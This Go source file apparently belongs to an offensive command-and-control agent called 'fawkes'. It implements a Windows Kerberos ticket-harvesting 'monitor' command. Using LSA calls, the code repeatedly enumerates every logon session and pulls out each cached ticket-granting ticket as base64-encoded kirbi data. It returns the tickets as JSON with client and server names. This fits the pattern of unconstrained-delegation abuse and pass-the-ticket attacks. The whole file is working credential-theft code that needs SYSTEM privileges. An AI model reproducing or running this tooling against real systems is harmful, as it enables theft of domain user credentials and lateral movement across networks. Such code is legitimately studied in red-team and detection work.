//go:build windows
// +build windows

package commands

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"time"
	"unicode/utf16"
	"unsafe"

	"fawkes/pkg/structs"
)

var (
	// Additional LSA procs for monitor action. secur32KL declared in klist_windows.go.
	procLsaEnumerateLogonSessions = secur32KL.NewProc("LsaEnumerateLogonSessions")
)

// luidKD is a Windows LUID (8 bytes: LowPart uint32 + HighPart int32).
type luidKD struct {
	LowPart  uint32
	HighPart int32
}

// kdCapturedTGT holds metadata and kirbi bytes for a captured TGT.
type kdCapturedTGT struct {
	LUID       string `json:"luid"`
	Client     string `json:"client"`
	Server     string `json:"server"`
	StartTime  string `json:"start_time,omitempty"`
	EndTime    string `json:"end_time,omitempty"`
	KirbiB64   string `json:"kirbi_b64"`
	CapturedAt string `json:"captured_at"`
}

// kdMonitorResult is the JSON output for the monitor action.
type kdMonitorResult struct {
	Duration int             `json:"duration"`
	Interval int             `json:"interval"`
	Total    int             `json:"total"`
	Message  string          `json:"message"`
	Captured []kdCapturedTGT `json:"captured"`
}

// kdEnumerateLogonSessions returns all active logon session LUIDs via LsaEnumerateLogonSessions.
func kdEnumerateLogonSessions() ([]luidKD, error) {
	var count uint32
	var luidPtr uintptr

	ret, _, _ := procLsaEnumerateLogonSessions.Call(
		uintptr(unsafe.Pointer(&count)),
		uintptr(unsafe.Pointer(&luidPtr)),
	)
	if ret != 0 {
		return nil, lsaNtStatusToError(ret)
	}
	if luidPtr != 0 {
		defer procLsaFreeReturnBuffer.Call(luidPtr)
	}
	if count == 0 || luidPtr == 0 {
		return nil, nil
	}

	luids := make([]luidKD, count)
	for i := uint32(0); i < count; i++ {
		p := (*luidKD)(unsafe.Pointer(luidPtr + uintptr(i)*8))
		luids[i] = *p
	}
	return luids, nil
}

// kdQuerySessionTGTs queries the Kerberos ticket cache for a specific logon session
// and returns all TGT-class tickets (krbtgt/ prefix).
func kdQuerySessionTGTs(handle uintptr, authPkg uint32, luid luidKD) []kerbTicketCacheInfoEx {
	req := kerbQueryTktCacheRequest{
		MessageType: kerbQueryTicketCacheExMessage,
		LogonIdLow:  luid.LowPart,
		LogonIdHigh: luid.HighPart,
	}

	var responsePtr uintptr
	var responseLen uint32
	var protocolStatus uintptr

	ret, _, _ := procLsaCallAuthenticationPkg.Call(
		handle,
		uintptr(authPkg),
		uintptr(unsafe.Pointer(&req)),
		uintptr(unsafe.Sizeof(req)),
		uintptr(unsafe.Pointer(&responsePtr)),
		uintptr(unsafe.Pointer(&responseLen)),
		uintptr(unsafe.Pointer(&protocolStatus)),
	)
	if responsePtr != 0 {
		defer procLsaFreeReturnBuffer.Call(responsePtr)
	}
	// Non-zero status means the session is not accessible; skip silently.
	if ret != 0 || protocolStatus != 0 || responsePtr == 0 || responseLen < 8 {
		return nil
	}

	countPtr := (*uint32)(unsafe.Pointer(responsePtr + 4))
	count := *countPtr
	if count == 0 {
		return nil
	}

	ticketBase := responsePtr + 8
	ticketSize := unsafe.Sizeof(kerbTicketCacheInfoEx{})

	var tgts []kerbTicketCacheInfoEx
	for i := uint32(0); i < count; i++ {
		ticketPtr := ticketBase + uintptr(i)*ticketSize
		ticket := (*kerbTicketCacheInfoEx)(unsafe.Pointer(ticketPtr))
		if kdIsTGT(readUS(ticket.ServerName)) {
			tgts = append(tgts, *ticket)
		}
	}
	return tgts
}

// kdDumpSessionTicket retrieves the kirbi (KRB-CRED) bytes for a ticket from a specific session.
func kdDumpSessionTicket(handle uintptr, authPkg uint32, luid luidKD, serverName string) ([]byte, error) {
	targetUTF16 := utf16.Encode([]rune(serverName))
	targetBuf := make([]uint16, len(targetUTF16)+1) // null-terminated
	copy(targetBuf, targetUTF16)

	req := kerbRetrieveTktRequest{
		MessageType:    kerbRetrieveEncodedTicketMessage,
		LogonIdLow:     luid.LowPart,
		LogonIdHigh:    luid.HighPart,
		CacheOptions:   kerbRetrieveTicketAsKerbCred,
		EncryptionType: 0,
	}
	req.TargetName = unicodeStringKL{
		Length:        uint16(len(targetUTF16) * 2),
		MaximumLength: uint16(len(targetBuf) * 2),
		Buffer:        uintptr(unsafe.Pointer(&targetBuf[0])),
	}

	var responsePtr uintptr
	var responseLen uint32
	var protocolStatus uintptr

	ret, _, _ := procLsaCallAuthenticationPkg.Call(
		handle,
		uintptr(authPkg),
		uintptr(unsafe.Pointer(&req)),
		uintptr(unsafe.Sizeof(req)),
		uintptr(unsafe.Pointer(&responsePtr)),
		uintptr(unsafe.Pointer(&responseLen)),
		uintptr(unsafe.Pointer(&protocolStatus)),
	)
	if responsePtr != 0 {
		defer procLsaFreeReturnBuffer.Call(responsePtr)
	}
	if ret != 0 || protocolStatus != 0 {
		return nil, fmt.Errorf("retrieve failed: NTSTATUS=0x%X proto=0x%X", ret, protocolStatus)
	}
	if responsePtr == 0 || responseLen == 0 {
		return nil, fmt.Errorf("empty response for %s", serverName)
	}

	data := make([]byte, responseLen)
	copy(data, unsafe.Slice((*byte)(unsafe.Pointer(responsePtr)), responseLen))
	return data, nil
}

// kdMonitor polls all logon sessions for TGTs for the specified duration.
// Requires elevated/SYSTEM privileges for cross-session access.
func kdMonitor(args kerbDelegArgs) structs.CommandResult {
	duration, interval := kdMonitorClampArgs(args.Duration, args.Interval)

	handle, err := lsaConnect()
	if err != nil {
		return errorf("connecting to LSA (requires elevated privileges): %v", err)
	}
	defer lsaClose(handle)

	authPkg, err := lsaLookupKerberos(handle)
	if err != nil {
		return errorf("looking up Kerberos package: %v", err)
	}

	seen := make(map[string]bool)
	var captured []kdCapturedTGT
	deadline := time.Now().Add(time.Duration(duration) * time.Second)

	for {
		luids, err := kdEnumerateLogonSessions()
		if err != nil {
			return errorf("enumerating logon sessions: %v", err)
		}

		for _, luid := range luids {
			luidHex := kdFormatLUID(luid.LowPart, luid.HighPart)

			for _, ticket := range kdQuerySessionTGTs(handle, authPkg, luid) {
				serverName := readUS(ticket.ServerName)
				serverRealm := readUS(ticket.ServerRealm)
				clientName := readUS(ticket.ClientName)
				clientRealm := readUS(ticket.ClientRealm)

				fullServer := fmt.Sprintf("%s@%s", serverName, serverRealm)
				fullClient := fmt.Sprintf("%s@%s", clientName, clientRealm)
				key := kdBuildTicketKey(fullClient, fullServer, luidHex)

				if seen[key] {
					continue
				}
				seen[key] = true

				kirbiData, err := kdDumpSessionTicket(handle, authPkg, luid, serverName)
				if err != nil {
					continue
				}

				tgt := kdCapturedTGT{
					LUID:       luidHex,
					Client:     fullClient,
					Server:     fullServer,
					KirbiB64:   base64.StdEncoding.EncodeToString(kirbiData),
					CapturedAt: time.Now().UTC().Format("2006-01-02T15:04:05Z"),
				}
				if st := filetimeToTimeKL(ticket.StartTime); !st.IsZero() {
					tgt.StartTime = st.Format("2006-01-02 15:04:05")
				}
				if et := filetimeToTimeKL(ticket.EndTime); !et.IsZero() {
					tgt.EndTime = et.Format("2006-01-02 15:04:05")
				}
				captured = append(captured, tgt)
			}
		}

		remaining := time.Until(deadline)
		if remaining <= 0 {
			break
		}
		sleep := time.Duration(interval) * time.Second
		if sleep > remaining {
			break
		}
		time.Sleep(sleep)
	}

	if captured == nil {
		captured = []kdCapturedTGT{}
	}

	msg := fmt.Sprintf("Monitored for %ds (interval: %ds). Captured %d new TGT(s).", duration, interval, len(captured))
	result := kdMonitorResult{
		Duration: duration,
		Interval: interval,
		Total:    len(captured),
		Message:  msg,
		Captured: captured,
	}

	data, err := json.Marshal(result)
	if err != nil {
		return errorf("marshaling monitor result: %v", err)
	}
	return successResult(string(data))
}
